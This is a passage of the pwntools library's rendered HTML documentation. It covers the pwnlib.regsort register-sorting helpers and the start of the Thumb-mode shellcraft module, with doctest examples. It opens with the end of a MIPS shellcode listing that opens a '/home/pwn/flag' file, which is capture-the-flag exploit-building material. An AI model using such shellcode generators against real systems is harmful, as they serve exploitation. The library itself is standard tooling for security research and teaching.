<span class="go">    /* push &#39;/home/pwn/flag\x00&#39; */</span>
<span class="go">    li $t1, 0x6d6f682f</span>
<span class="go">    sw $t1, -16($sp)</span>
<span class="go">    li $t1, 0x77702f65</span>
<span class="go">    sw $t1, -12($sp)</span>
<span class="go">    li $t1, 0x6c662f6e</span>
<span class="go">    sw $t1, -8($sp)</span>
<span class="go">    ori $t1, $zero, 26465</span>
<span class="go">    sw $t1, -4($sp)</span>
<span class="go">    addiu $sp, $sp, -16</span>
<span class="go">    add $a0, $sp, $0 /* mov $a0, $sp */</span>
<span class="go">    slti $a1, $zero, 0xFFFF /* $a1 = 0 */</span>
<span class="go">    slti $a2, $zero, 0xFFFF /* $a2 = 0 */</span>
<span class="go">    /* call open() */</span>
<span class="go">    ori $v0, $zero, SYS_open</span>
<span class="go">    syscall 0x40404</span>
</pre></div>
</div>
</dd></dl>

</div>
</div>
<span id="document-shellcraft/regsort"></span><div class="section" id="module-pwnlib.regsort">
<span id="pwnlib-regsort-register-sorting"></span><h5><a class="reference internal" href="#module-pwnlib.regsort" title="pwnlib.regsort"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.regsort</span></code></a> &#8212; Register sorting<a class="headerlink" href="#module-pwnlib.regsort" title="Permalink to this headline">¶</a></h5>
<p>Topographical sort</p>
<dl class="function">
<dt id="pwnlib.regsort.check_cycle">
<code class="descclassname">pwnlib.regsort.</code><code class="descname">check_cycle</code><span class="sig-paren">(</span><em>reg</em>, <em>assignments</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/regsort.py#L17-39"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.regsort.check_cycle" title="Permalink to this definition">¶</a></dt>
<dd><p>Walk down the assignment list of a register,
return the path walked if it is encountered again.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body">The list of register involved in the cycle.
If there is no cycle, this is an empty list.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">check_cycle</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;a&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">})</span>
<span class="go">[]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">check_cycle</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;a&#39;</span><span class="p">:</span> <span class="s1">&#39;a&#39;</span><span class="p">})</span>
<span class="go">[&#39;a&#39;]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">check_cycle</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;a&#39;</span><span class="p">:</span> <span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">:</span> <span class="s1">&#39;a&#39;</span><span class="p">})</span>
<span class="go">[&#39;a&#39;, &#39;b&#39;]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">check_cycle</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;a&#39;</span><span class="p">:</span> <span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">:</span> <span class="s1">&#39;c&#39;</span><span class="p">,</span> <span class="s1">&#39;c&#39;</span><span class="p">:</span> <span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="s1">&#39;d&#39;</span><span class="p">:</span> <span class="s1">&#39;a&#39;</span><span class="p">})</span>
<span class="go">[]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">check_cycle</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;a&#39;</span><span class="p">:</span> <span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">:</span> <span class="s1">&#39;c&#39;</span><span class="p">,</span> <span class="s1">&#39;c&#39;</span><span class="p">:</span> <span class="s1">&#39;d&#39;</span><span class="p">,</span> <span class="s1">&#39;d&#39;</span><span class="p">:</span> <span class="s1">&#39;a&#39;</span><span class="p">})</span>
<span class="go">[&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;]</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.regsort.extract_dependencies">
<code class="descclassname">pwnlib.regsort.</code><code class="descname">extract_dependencies</code><span class="sig-paren">(</span><em>reg</em>, <em>assignments</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/regsort.py#L63-79"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.regsort.extract_dependencies" title="Permalink to this definition">¶</a></dt>
<dd><p>Return a list of all registers which directly
depend on the specified register.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">extract_dependencies</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;a&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">})</span>
<span class="go">[]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">extract_dependencies</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;a&#39;</span><span class="p">:</span> <span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">})</span>
<span class="go">[]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">extract_dependencies</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;a&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">:</span> <span class="s1">&#39;a&#39;</span><span class="p">})</span>
<span class="go">[&#39;b&#39;]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">extract_dependencies</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;a&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">:</span> <span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;c&#39;</span><span class="p">:</span> <span class="s1">&#39;a&#39;</span><span class="p">})</span>
<span class="go">[&#39;b&#39;, &#39;c&#39;]</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.regsort.regsort">
<code class="descclassname">pwnlib.regsort.</code><code class="descname">regsort</code><span class="sig-paren">(</span><em>in_out</em>, <em>all_regs</em>, <em>tmp=None</em>, <em>xchg=True</em>, <em>randomize=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/regsort.py#L112-423"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.regsort.regsort" title="Permalink to this definition">¶</a></dt>
<dd><p>Sorts register dependencies.</p>
<p>Given a dictionary of registers to desired register contents,
return the optimal order in which to set the registers to
those contents.</p>
<p>The implementation assumes that it is possible to move from
any register to any other register.</p>
<p>If a dependency cycle is encountered, one of the following will
occur:</p>
<ul class="simple">
<li>If <code class="docutils literal"><span class="pre">xchg</span></code> is <code class="xref py py-const docutils literal"><span class="pre">True</span></code>, it is assumed that dependency cyles can
be broken by swapping the contents of two register (a la the
<code class="docutils literal"><span class="pre">xchg</span></code> instruction on i386).</li>
<li>If <code class="docutils literal"><span class="pre">xchg</span></code> is not set, but not all destination registers in
<code class="docutils literal"><span class="pre">in_out</span></code> are involved in a cycle, one of the registers
outside the cycle will be used as a temporary register,
and then overwritten with its final value.</li>
<li>If <code class="docutils literal"><span class="pre">xchg</span></code> is not set, and all registers are involved in
a dependency cycle, the named register <code class="docutils literal"><span class="pre">temporary</span></code> is used
as a temporary register.</li>
<li>If the dependency cycle cannot be resolved as described above,
an exception is raised.</li>
</ul>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>in_out</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><em>dict</em></a>) &#8211; Dictionary of desired register states.
Keys are registers, values are either registers or any other value.</li>
<li><strong>all_regs</strong> (<a class="reference internal" href="index.html#pwnlib.protocols.adb.AdbClient.list" title="pwnlib.protocols.adb.AdbClient.list"><em>list</em></a>) &#8211; List of all possible registers.
Used to determine which values in <code class="docutils literal"><span class="pre">in_out</span></code> are registers, versus
regular values.</li>
<li><strong>tmp</strong> (<em>obj</em><em>, </em><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Named register (or other sentinel value) to use as a temporary
register.  If <code class="docutils literal"><span class="pre">tmp</span></code> is a named register <strong>and</strong> appears
as a source value in <code class="docutils literal"><span class="pre">in_out</span></code>, dependencies are handled
appropriately.  <code class="docutils literal"><span class="pre">tmp</span></code> cannot be a destination register
in <code class="docutils literal"><span class="pre">in_out</span></code>.
If <code class="docutils literal"><span class="pre">bool(tmp)==True</span></code>, this mode is enabled.</li>
<li><strong>xchg</strong> (<em>obj</em>) &#8211; Indicates the existence of an instruction which can swap the
contents of two registers without use of a third register.
If <code class="docutils literal"><span class="pre">bool(xchg)==False</span></code>, this mode is disabled.</li>
<li><strong>random</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Randomize as much as possible about the order or registers.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last"><p>A list of tuples of <code class="docutils literal"><span class="pre">(src,</span> <span class="pre">dest)</span></code>.</p>
<p>Each register may appear more than once, if a register is used
as a temporary register, and later overwritten with its final
value.</p>
<p>If <code class="docutils literal"><span class="pre">xchg</span></code> is <code class="xref py py-const docutils literal"><span class="pre">True</span></code> and it is used to break a dependency cycle,
then <code class="docutils literal"><span class="pre">reg_name</span></code> will be <code class="xref py py-const docutils literal"><span class="pre">None</span></code> and <code class="docutils literal"><span class="pre">value</span></code> will be a tuple
of the instructions to swap.</p>
</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">R</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="s1">&#39;c&#39;</span><span class="p">,</span> <span class="s1">&#39;d&#39;</span><span class="p">,</span> <span class="s1">&#39;x&#39;</span><span class="p">,</span> <span class="s1">&#39;y&#39;</span><span class="p">,</span> <span class="s1">&#39;z&#39;</span><span class="p">]</span>
</pre></div>
</div>
<p>If order doesn&#8217;t matter for any subsequence, alphabetic
order is used.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">regsort</span><span class="p">({</span><span class="s1">&#39;a&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">:</span> <span class="mi">2</span><span class="p">},</span> <span class="n">R</span><span class="p">)</span>
<span class="go">[(&#39;mov&#39;, &#39;a&#39;, 1), (&#39;mov&#39;, &#39;b&#39;, 2)]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">regsort</span><span class="p">({</span><span class="s1">&#39;a&#39;</span><span class="p">:</span> <span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">:</span> <span class="s1">&#39;a&#39;</span><span class="p">},</span> <span class="n">R</span><span class="p">)</span>
<span class="go">[(&#39;xchg&#39;, &#39;a&#39;, &#39;b&#39;)]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">regsort</span><span class="p">({</span><span class="s1">&#39;a&#39;</span><span class="p">:</span> <span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">:</span> <span class="s1">&#39;a&#39;</span><span class="p">},</span> <span class="n">R</span><span class="p">,</span> <span class="n">tmp</span><span class="o">=</span><span class="s1">&#39;X&#39;</span><span class="p">)</span> 
<span class="go">[(&#39;mov&#39;, &#39;X&#39;, &#39;a&#39;),</span>
<span class="go"> (&#39;mov&#39;, &#39;a&#39;, &#39;b&#39;),</span>
<span class="go"> (&#39;mov&#39;, &#39;b&#39;, &#39;X&#39;)]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">regsort</span><span class="p">({</span><span class="s1">&#39;a&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">:</span> <span class="s1">&#39;a&#39;</span><span class="p">},</span> <span class="n">R</span><span class="p">)</span> 
<span class="go">[(&#39;mov&#39;, &#39;b&#39;, &#39;a&#39;),</span>
<span class="go"> (&#39;mov&#39;, &#39;a&#39;, 1)]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">regsort</span><span class="p">({</span><span class="s1">&#39;a&#39;</span><span class="p">:</span> <span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">:</span> <span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;c&#39;</span><span class="p">:</span> <span class="mi">3</span><span class="p">},</span> <span class="n">R</span><span class="p">)</span> 
<span class="go">[(&#39;mov&#39;, &#39;c&#39;, 3),</span>
<span class="go"> (&#39;xchg&#39;, &#39;a&#39;, &#39;b&#39;)]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">regsort</span><span class="p">({</span><span class="s1">&#39;a&#39;</span><span class="p">:</span> <span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">:</span> <span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;c&#39;</span><span class="p">:</span> <span class="s1">&#39;b&#39;</span><span class="p">},</span> <span class="n">R</span><span class="p">)</span> 
<span class="go">[(&#39;mov&#39;, &#39;c&#39;, &#39;b&#39;),</span>
<span class="go"> (&#39;xchg&#39;, &#39;a&#39;, &#39;b&#39;)]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">regsort</span><span class="p">({</span><span class="s1">&#39;a&#39;</span><span class="p">:</span><span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">:</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;x&#39;</span><span class="p">:</span><span class="s1">&#39;b&#39;</span><span class="p">},</span> <span class="n">R</span><span class="p">,</span> <span class="n">tmp</span><span class="o">=</span><span class="s1">&#39;y&#39;</span><span class="p">,</span> <span class="n">xchg</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span> 
<span class="go">[(&#39;mov&#39;, &#39;x&#39;, &#39;b&#39;),</span>
<span class="go"> (&#39;mov&#39;, &#39;y&#39;, &#39;a&#39;),</span>
<span class="go"> (&#39;mov&#39;, &#39;a&#39;, &#39;b&#39;),</span>
<span class="go"> (&#39;mov&#39;, &#39;b&#39;, &#39;y&#39;)]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">regsort</span><span class="p">({</span><span class="s1">&#39;a&#39;</span><span class="p">:</span><span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">:</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;x&#39;</span><span class="p">:</span><span class="s1">&#39;b&#39;</span><span class="p">},</span> <span class="n">R</span><span class="p">,</span> <span class="n">tmp</span><span class="o">=</span><span class="s1">&#39;x&#39;</span><span class="p">,</span> <span class="n">xchg</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span> 
<span class="gt">Traceback (most recent call last):</span>
<span class="c">...</span>
<span class="gr">PwnlibException</span>: <span class="n">Cannot break dependency cycles ...</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">regsort</span><span class="p">({</span><span class="s1">&#39;a&#39;</span><span class="p">:</span><span class="s1">&#39;b&#39;</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="p">:</span><span class="s1">&#39;c&#39;</span><span class="p">,</span><span class="s1">&#39;c&#39;</span><span class="p">:</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;x&#39;</span><span class="p">:</span><span class="s1">&#39;1&#39;</span><span class="p">,</span><span class="s1">&#39;y&#39;</span><span class="p">:</span><span class="s1">&#39;z&#39;</span><span class="p">,</span><span class="s1">&#39;z&#39;</span><span class="p">:</span><span class="s1">&#39;c&#39;</span><span class="p">},</span> <span class="n">R</span><span class="p">)</span> 
<span class="go">[(&#39;mov&#39;, &#39;x&#39;, &#39;1&#39;),</span>
<span class="go"> (&#39;mov&#39;, &#39;y&#39;, &#39;z&#39;),</span>
<span class="go"> (&#39;mov&#39;, &#39;z&#39;, &#39;c&#39;),</span>
<span class="go"> (&#39;xchg&#39;, &#39;a&#39;, &#39;b&#39;),</span>
<span class="go"> (&#39;xchg&#39;, &#39;b&#39;, &#39;c&#39;)]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">regsort</span><span class="p">({</span><span class="s1">&#39;a&#39;</span><span class="p">:</span><span class="s1">&#39;b&#39;</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="p">:</span><span class="s1">&#39;c&#39;</span><span class="p">,</span><span class="s1">&#39;c&#39;</span><span class="p">:</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;x&#39;</span><span class="p">:</span><span class="s1">&#39;1&#39;</span><span class="p">,</span><span class="s1">&#39;y&#39;</span><span class="p">:</span><span class="s1">&#39;z&#39;</span><span class="p">,</span><span class="s1">&#39;z&#39;</span><span class="p">:</span><span class="s1">&#39;c&#39;</span><span class="p">},</span> <span class="n">R</span><span class="p">,</span> <span class="n">tmp</span><span class="o">=</span><span class="s1">&#39;x&#39;</span><span class="p">)</span> 
<span class="go">[(&#39;mov&#39;, &#39;y&#39;, &#39;z&#39;),</span>
<span class="go"> (&#39;mov&#39;, &#39;z&#39;, &#39;c&#39;),</span>
<span class="go"> (&#39;mov&#39;, &#39;x&#39;, &#39;a&#39;),</span>
<span class="go"> (&#39;mov&#39;, &#39;a&#39;, &#39;b&#39;),</span>
<span class="go"> (&#39;mov&#39;, &#39;b&#39;, &#39;c&#39;),</span>
<span class="go"> (&#39;mov&#39;, &#39;c&#39;, &#39;x&#39;),</span>
<span class="go"> (&#39;mov&#39;, &#39;x&#39;, &#39;1&#39;)]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">regsort</span><span class="p">({</span><span class="s1">&#39;a&#39;</span><span class="p">:</span><span class="s1">&#39;b&#39;</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="p">:</span><span class="s1">&#39;c&#39;</span><span class="p">,</span><span class="s1">&#39;c&#39;</span><span class="p">:</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;x&#39;</span><span class="p">:</span><span class="s1">&#39;1&#39;</span><span class="p">,</span><span class="s1">&#39;y&#39;</span><span class="p">:</span><span class="s1">&#39;z&#39;</span><span class="p">,</span><span class="s1">&#39;z&#39;</span><span class="p">:</span><span class="s1">&#39;c&#39;</span><span class="p">},</span> <span class="n">R</span><span class="p">,</span> <span class="n">xchg</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> 
<span class="go">[(&#39;mov&#39;, &#39;y&#39;, &#39;z&#39;),</span>
<span class="go"> (&#39;mov&#39;, &#39;z&#39;, &#39;c&#39;),</span>
<span class="go"> (&#39;mov&#39;, &#39;x&#39;, &#39;a&#39;),</span>
<span class="go"> (&#39;mov&#39;, &#39;a&#39;, &#39;b&#39;),</span>
<span class="go"> (&#39;mov&#39;, &#39;b&#39;, &#39;c&#39;),</span>
<span class="go"> (&#39;mov&#39;, &#39;c&#39;, &#39;x&#39;),</span>
<span class="go"> (&#39;mov&#39;, &#39;x&#39;, &#39;1&#39;)]</span>
<span class="go"> &gt;&gt;&gt; regsort({&#39;a&#39;: &#39;b&#39;, &#39;b&#39;: &#39;c&#39;}, [&#39;a&#39;,&#39;b&#39;,&#39;c&#39;], xchg=0)</span>
<span class="go"> [(&#39;mov&#39;, &#39;a&#39;, &#39;b&#39;), (&#39;mov&#39;, &#39;b&#39;, &#39;c&#39;)]</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.regsort.resolve_order">
<code class="descclassname">pwnlib.regsort.</code><code class="descname">resolve_order</code><span class="sig-paren">(</span><em>reg</em>, <em>deps</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/regsort.py#L82-103"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.regsort.resolve_order" title="Permalink to this definition">¶</a></dt>
<dd><p>Resolve the order of all dependencies starting at a given register.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">want</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;a&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">:</span> <span class="s1">&#39;c&#39;</span><span class="p">,</span> <span class="s1">&#39;c&#39;</span><span class="p">:</span> <span class="s1">&#39;d&#39;</span><span class="p">,</span> <span class="s1">&#39;d&#39;</span><span class="p">:</span> <span class="mi">7</span><span class="p">,</span> <span class="s1">&#39;x&#39;</span><span class="p">:</span> <span class="s1">&#39;d&#39;</span><span class="p">}</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">deps</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;a&#39;</span><span class="p">:</span> <span class="p">[],</span> <span class="s1">&#39;b&#39;</span><span class="p">:</span> <span class="p">[],</span> <span class="s1">&#39;c&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">],</span> <span class="s1">&#39;d&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">,</span> <span class="s1">&#39;x&#39;</span><span class="p">],</span> <span class="s1">&#39;x&#39;</span><span class="p">:</span> <span class="p">[]}</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">resolve_order</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="n">deps</span><span class="p">)</span>
<span class="go">[&#39;a&#39;]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">resolve_order</span><span class="p">(</span><span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="n">deps</span><span class="p">)</span>
<span class="go">[&#39;b&#39;]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">resolve_order</span><span class="p">(</span><span class="s1">&#39;c&#39;</span><span class="p">,</span> <span class="n">deps</span><span class="p">)</span>
<span class="go">[&#39;b&#39;, &#39;c&#39;]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">resolve_order</span><span class="p">(</span><span class="s1">&#39;d&#39;</span><span class="p">,</span> <span class="n">deps</span><span class="p">)</span>
<span class="go">[&#39;b&#39;, &#39;c&#39;, &#39;x&#39;, &#39;d&#39;]</span>
</pre></div>
</div>
</dd></dl>

</div>
<span id="document-shellcraft/thumb"></span><div class="section" id="pwnlib-shellcraft-thumb-shellcode-for-thumb-mode">
<h5><a class="reference internal" href="#module-pwnlib.shellcraft.thumb" title="pwnlib.shellcraft.thumb"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.shellcraft.thumb</span></code></a> &#8212; Shellcode for Thumb Mode<a class="headerlink" href="#pwnlib-shellcraft-thumb-shellcode-for-thumb-mode" title="Permalink to this headline">¶</a></h5>
<div class="section" id="module-pwnlib.shellcraft.thumb">
<span id="pwnlib-shellcraft-thumb"></span><h6><a class="reference internal" href="#module-pwnlib.shellcraft.thumb" title="pwnlib.shellcraft.thumb"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.shellcraft.thumb</span></code></a><a class="headerlink" href="#module-pwnlib.shellcraft.thumb" title="Permalink to this headline">¶</a></h6>
<p>Shellcraft module containing generic thumb little endian shellcodes.</p>
<dl class="function">
<dt id="pwnlib.shellcraft.thumb.crash">
<code class="descclassname">pwnlib.shellcraft.thumb.</code><code class="descname">crash</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/crash.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.crash" title="Permalink to this definition">¶</a></dt>
<dd><p>Crash.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">run_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">crash</span><span class="p">())</span><span class="o">.</span><span class="n">poll</span><span class="p">(</span><span class="kc">True</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.infloop">
<code class="descclassname">pwnlib.shellcraft.thumb.</code><code class="descname">infloop</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/infloop.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.infloop" title="Permalink to this definition">¶</a></dt>
<dd><p>An infinite loop.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.itoa">
<code class="descclassname">pwnlib.shellcraft.thumb.</code><code class="descname">itoa</code><span class="sig-paren">(</span><em>v</em>, <em>buffer='sp'</em>, <em>allocate_stack=True</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/itoa.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.itoa" title="Permalink to this definition">¶</a></dt>
<dd><p>Converts an integer into its string representation, and pushes it
onto the stack.  Uses registers r0-r5.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>v</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a><em>, </em><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Integer constant or register that contains the value to convert.</li>
<li><strong>alloca</strong> &#8211; </li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">thumb</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;r0&#39;</span><span class="p">,</span> <span class="mh">0xdeadbeef</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">thumb</span><span class="o">.</span><span class="n">itoa</span><span class="p">(</span><span class="s1">&#39;r0&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">thumb</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;sp&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">run_assembly</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="go">&#39;3735928559\x00&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.memcpy">
<code class="descclassname">pwnlib.shellcraft.thumb.</code><code class="descname">memcpy</code><span class="sig-paren">(</span><em>dest</em>, <em>src</em>, <em>n</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/memcpy.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.memcpy" title="Permalink to this definition">¶</a></dt>
<dd><p>Copies memory.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>dest</strong> &#8211; Destination address</li>
<li><strong>src</strong> &#8211; Source address</li>
<li><strong>n</strong> &#8211; Number of bytes</li>
</ul>
</td>
</tr>
